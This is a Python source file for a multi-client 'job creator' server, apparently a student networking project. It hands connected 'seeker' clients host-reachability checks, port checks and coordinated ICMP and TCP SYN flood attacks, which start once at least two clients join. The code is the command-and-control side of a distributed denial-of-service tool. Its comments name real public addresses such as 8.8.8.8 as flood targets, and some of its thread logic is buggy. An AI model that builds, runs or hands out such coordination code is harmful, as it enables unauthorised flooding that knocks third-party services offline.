import socket
import sys
import random
import threading
import time
from scapy.all import *

#TEST CASES
#Detect Port Status - Success: IP 8.8.8.8, port 53 (google server, port 53 is DNS recognition) Failure: IP 8.8.8.8, port 52034 (very high value, non-essential port)
#Check If Online - Success: 8.8.8.8 Failure: 43.242.188.0 (a Chinese IP)
#ICMP Attack - IP 8.8.8.8
#TCP Attack - IP 8.8.8.8

clients_connected: int = 0
currentThread: int = 0
threadInit: int = 0
startJob: int = 0
multDest = ""
multTime = ""
multPort = ""
globCondition: int=0
globJob: int=-1

def detectPortStatus(csock, address):
    #Get destination IP and port
    destIP = input("Enter the IP of destination: ")
    destPort= input("Enter the Port Number of the destination: ")

    try:
        csock.send(f"detect_Port_Status$Job creator wants${destIP}*{destPort}".encode()) #send job details, will be split and analyzed by the seeker
        data = csock.recv(1024).decode() #receive response from seeker
        if data == "PORT OPEN":
            print(f"Job completed. Port {destPort} of IP {destIP} is open.")
        else:
            print(f"Job completed. Port {destPort} of IP {destIP} is closed.")

    except:
        print("ran out of time.")


def checkIfOnline(csock, address):
    destination = input("Enter an IP destination or Host Name to see if it's online: \n")
    try:
        csock.send(f"check_If_Online$ Job creator wants you to see if this IP is online${destination}".encode())
        data = csock.recv(1024).decode()
        if data == "ONLINE":
            print(f"Job completed. {destination} is Online")
        else:
            print(f"Job completed. {destination} is Offline")

    except:
        print("ran out of time.")

def icmpAttack(csock, address):
    global multDest
    global multTime
    global globCondition
    if currentThread == threading.get_ident():
        destination = input("Enter an IP to flood with ICMP packets: \n")
        timeout = input("Enter how many seconds to flood IP for: \n")
        multDest = destination
        multTime = timeout
        globCondition = 1
    else:
        while globCondition == 0:
            time.sleep(1)

    try:
        csock.send(f"icmp_flood_attack$ Job creator wants you flood an IP with ICMP packets${multDest}*{multTime}".encode())
        data = csock.recv(1024).decode()
        if data == "Flood_finished":
            print(f"{multDest} was Flooded with ICMP packets")
        else:
            print(f"An error occured")

    except:
        print("ran out of time.")

    globCondition = 0



def tcpAttack(csock, address): #Attack an address with a flood of TCP pings
    global multDest
    global multTime
    global multPort
    global globCondition
    if currentThread == threading.get_ident():
        destination = input("Enter an IP to flood with SYN packets: \n")
        port = input("Enter port to flood with SYN packets: \n")
        timeout = input("Enter how many seconds to flood IP for: \n")
        multDest = destination
        multTime = timeout
        multPort = port
        globCondition = 1
    else:
        while globCondition == 0:
            time.sleep(1)
    try:
        csock.send(f"tcp_flood_attack$ Job creator wants you flood an IP with TCP packets${multDest}*{multPort}*{multTime}".encode()) #send job to seeker
        data = csock.recv(1024).decode() #receive data from seeker
        if data == "Flood_finished":
            print(f"{destination} was Flooded with TCP packets")
        else:
            print(f"An error occured")

    except:
        print("ran out of time.")

    globCondition = 0


def newClient(csock, address):
    global clients_connected
    global currentThread
    global threadInit
    global startJob
    global globJob
    jobList = ["check_If_Online", "detect_Port_Status", "icmp_flood_attack","tcp_flood_attack"]

    print(f"# of clients connected is {clients_connected}")
    rand = random.randint(0,3)
    if globJob > 0:
        rand = globJob
    #rand = 3
    print(threading.get_ident())
    numOfNodes = ""
    if rand <= 1:
        numOfNodes = "1 person"
    else:
        numOfNodes = "more than 1 person"
    print(jobList[rand])
    csock.send(f"The job is {jobList[rand]} created for {numOfNodes}. Accept?(Y/N)".encode()) #send job details to seekers
    choice = csock.recv(1024).decode()


    if choice == "Y": 
        clients_connected += 1
        if (rand == 0):
            checkIfOnline(csock, address)
        if (rand == 1):
            detectPortStatus(csock, address)
        if (rand == 2):
            if threadInit == 0:
                currentThread = threading.get_ident()
                threadInit+=1
                globJob = rand
            while True:
                if(clients_connected > 1):
                    if currentThread == threading.get_ident():
                        multChoice = input(f"Execute ICMP Attack with {clients_connected} clients? (Y/N): ").upper()
                        if multChoice == "Y":
                            print(f"Executing ICMP Attack with {clients_connected} clients.")
                            startJob = 1
                        else:
                            print("Lets keep waiting then.")
                    if startJob == 1:
                        icmpAttack(csock, address)
                        startJob = 0
                        currentThread = 0
                        threadInit = 0
                        globJob = -1
                        break

                else:
                    print("Waiting for at least 2 clients to continue")

                time.sleep(3)
        if (rand == 3):
            if threadInit == 0:
                currentThread = threading.get_ident()
                threadInit+=1
                globJob = rand
            while True:
                if(clients_connected > 1):
                    if currentThread == threading.get_ident():
                        multChoice = input(f"Execute TCP Attack with {clients_connected} clients? (Y/N): ").upper()
                        if multChoice == "Y":
                            print(f"Executing TCP Attack with {clients_connected} clients.")
                            startJob = 1
                        else:
                            print("Lets keep waiting then.")
                    if startJob == 1:
                        tcpAttack(csock, address)
                        currentThread = 0
                        threadInit = 0
                        startJob = 0
                        globJob = -1
                        break

                else:
                    print("Waiting for at least 2 clients to continue")

                time.sleep(3)
        clients_connected -= 1
    else:
        print("Job refused by seeker")

    csock.close()

    print(f"# of clients connected is {clients_connected}")
    print("Looking for seekers...")

def Main():
    host = "127.0.0.1"
    #port = int(sys.argv[1])
    print(threading.get_ident())
    port= 5000
    while True:
        mySocket = socket.socket() #create socket
        mySocket.bind((host, port))
        # while True:
        mySocket.listen(0) #await connection from seeker
        #conn, addr = mySocket.accept()
        print("Looking for seekers...")
        while True: #connect seekers to creator

            conn, addr = mySocket.accept()
            print("Connection from seeker: " + str(addr))
            cThread = threading.Thread(target=newClient, args=(conn,addr,))
            cThread.start()
    mySocket.close()




if __name__ == '__main__':
    Main()
